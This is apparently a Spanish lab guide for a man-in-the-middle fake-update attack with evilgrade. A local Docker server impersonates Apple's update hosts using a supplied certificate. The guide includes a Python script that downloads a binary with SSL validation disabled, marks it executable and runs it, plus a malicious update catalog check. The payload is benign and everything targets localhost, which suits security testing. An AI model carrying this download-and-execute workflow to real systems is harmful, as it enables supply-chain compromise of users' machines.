# evilgrade - Manual Payload Delivery & Execution Test

## Ataque MITM Completo - Paso a Paso

Este documento te guía para ejecutar manualmente un ataque MITM completo con evilgrade, incluyendo:
- Servidor HTTPS con certificados emudhra
- Inyección de payload (binario ejecutable)
- Descarga y ejecución en tu máquina

---

## PASO 1: Compilar el binario helloworld

Crea el código fuente C:

```bash
cat > /tmp/helloworld.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

int main() {
    printf("[EVILGRADE PAYLOAD EXECUTED]\n");
    printf("Hello from evilgrade MITM attack!\n");
    printf("This binary was intercepted and delivered via malicious update.\n");
    printf("Payload execution successful at: ");
    fflush(stdout);
    system("date");
    return 0;
}
EOF
```

Compila a binario:

```bash
gcc -o /Users/famato/dev/evilgrade/include/macos/helloworld /tmp/helloworld.c
```

Verifica el binario:

```bash
file /Users/famato/dev/evilgrade/include/macos/helloworld
# Debe mostrar: "Mach-O 64-bit executable arm64"
```

---

## PASO 2: Iniciar el contenedor Docker

Asegúrate que Docker está corriendo, luego:

```bash
cd /Users/famato/dev/evilgrade

# Apagar cualquier contenedor anterior
docker compose down

# Iniciar contenedor limpio
docker compose up -d

# Esperar 5 segundos
sleep 5
```

---

## PASO 3: Iniciar servidor evilgrade en el contenedor

En una **terminal separada** (o background), ejecuta:

```bash
cd /Users/famato/dev/evilgrade

docker compose exec evilgrade bash -c 'cd /evilgrade && \
  perl evilgrade-simple-server.pl \
    --port 8443 \
    --module macos_softwareupdate \
    --cert /evilgrade/certs/emudhra_authorized/server.pem \
    --key /evilgrade/certs/emudhra_authorized/server.key'
```

**Deberías ver:**

```
[*] evilgrade Simple Server
[*] Port: 8443
[*] Module: macos_softwareupdate
[*] Certificate: /evilgrade/certs/emudhra_authorized/server.pem
[*] Key: /evilgrade/certs/emudhra_authorized/server.key

[+] Module loaded: macOS Software Update
[+] Virtual host regex: (swcdn\.apple\.com|updates\.apple\.com)

[+] HTTPS server listening on 0.0.0.0:8443
[+] Press Ctrl+C to stop
```

**⚠️ IMPORTANTE:** Deja esta terminal abierta, el servidor debe estar corriendo.

---

## PASO 4: En otra terminal - Descarga y ejecuta el payload

```bash
python3 << 'PYEOF'
import urllib.request, urllib.error, ssl, os, subprocess

# Desactiva validación SSL (MITM)
ssl._create_default_https_context = ssl._create_unverified_context

url = "https://127.0.0.1:8443/helloworld"
output_file = "/tmp/evilgrade_helloworld_manual"

print(f"[*] Descargando payload desde: {url}\n")

try:
    with urllib.request.urlopen(url, timeout=5) as response:
        data = response.read()
        
        print(f"[+] Descargados: {len(data)} bytes")
        print(f"[+] Content-Type: {response.headers.get('Content-Type')}")
        print(f"[+] Status: HTTP {response.status}\n")
        
        # Guardar binario
        with open(output_file, 'wb') as f:
            f.write(data)
        
        # Hacer ejecutable
        os.chmod(output_file, 0o755)
        print(f"[+] Guardado: {output_file}")
        print(f"[+] Hecho ejecutable\n")
        
        # EJECUTAR
        print("[*] EJECUTANDO PAYLOAD INTERCEPTADO:")
        print("=" * 70)
        
        result = subprocess.run([output_file], capture_output=True, text=True, timeout=5)
        
        print(result.stdout)
        if result.stderr:
            print("[STDERR]:", result.stderr)
        
        print("=" * 70)
        print(f"\n[✓] Ejecución completada. Exit code: {result.returncode}")
        
except Exception as e:
    print(f"[!] Error: {e}")
    print(f"    Verifica que el servidor esté corriendo en 127.0.0.1:8443")

PYEOF
```

---

## PASO 5 (Opcional): Verifica el catálogo malicioso

Mientras el servidor está corriendo, prueba el XML catalog:

```bash
python3 << 'PYEOF'
import urllib.request, ssl

ssl._create_default_https_context = ssl._create_unverified_context

url = "https://127.0.0.1:8443/index.sucatalog"

print(f"[*] Solicitando: {url}\n")

try:
    with urllib.request.urlopen(url, timeout=5) as response:
        data = response.read().decode('utf-8', errors='ignore')
        
        print(f"[+] HTTP {response.status}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type')}")
        print(f"[+] Size: {len(data)} bytes\n")
        
        if 'INTERCEPTED' in data:
            print("[✓] Catálogo malicioso detectado (contiene INTERCEPTED)")
            print(f"\n[+] Preview:\n{data[:200]}...\n")
        else:
            print("[!] Catálogo sin marcador de interceptación")
            
except Exception as e:
    print(f"[!] Error: {e}")

PYEOF
```

---

## RESULTADO ESPERADO

Cuando ejecutes el PASO 4, deberías ver:

```
[*] Descargando payload desde: https://127.0.0.1:8443/helloworld

[+] Descargados: 33560 bytes
[+] Content-Type: application/octet-stream
[+] Status: HTTP 200

[+] Guardado: /tmp/evilgrade_helloworld_manual
[+] Hecho ejecutable

[*] EJECUTANDO PAYLOAD INTERCEPTADO:
======================================================================
[EVILGRADE PAYLOAD EXECUTED]
Hello from evilgrade MITM attack!
This binary was intercepted and delivered via malicious update.
Payload execution successful at: Wed Oct 28 HH:MM:SS -03 2026

======================================================================

[✓] Ejecución completada. Exit code: 0
```

---

## VERIFICACIÓN

Para verificar que todo funcionó:

```bash
# 1. Verifica que el archivo fue descargado
ls -la /tmp/evilgrade_helloworld_manual

# 2. Verifica su tipo
file /tmp/evilgrade_helloworld_manual

# 3. Ejecutalo manualmente
/tmp/evilgrade_helloworld_manual
```

---

## LOGS DEL SERVIDOR

Mientras descargas, en la terminal del servidor deberías ver:

```
[+] 172.64.66.1: GET /helloworld HTTP/1.1
    [+] Matched rule: /helloworld
```

---

## TROUBLESHOOTING

### "Connection refused"
- Verifica que el servidor esté corriendo en la otra terminal
- Espera 5 segundos después de iniciar el servidor

### "Certificate validation failed"
- Normal, es expected porque usamos emudhra CA
- Python lo ignora con `ssl._create_unverified_context`

### "Address already in use"
```bash
# Mata procesos anteriores
pkill -f "evilgrade-simple-server"
docker compose down
docker compose up -d
```

### El archivo no se ejecuta
```bash
# Verifica permisos
chmod +x /tmp/evilgrade_helloworld_manual

# O instala gcc si no lo tienes
brew install gcc  # macOS
```

---

## LIMPIEZA

Cuando termines:

```bash
# Detener servidor (Ctrl+C en la terminal donde corre)
# O desde otra terminal:
docker compose down

# Eliminar payloads
rm /tmp/helloworld.c /tmp/evilgrade_helloworld_manual
```

---

## QUÉ APRENDISTE

✅ Compilar binarios arm64 para macOS
✅ Servir binarios via HTTPS/MITM
✅ Inyectar payloads en catálogos de update
✅ Descargar y ejecutar código interceptado
✅ Eludir validación SSL con certificado comprometido

**Este es un ataque MITM de suministro de software completo bajo SEC-AUTH-2026-01** 🎯
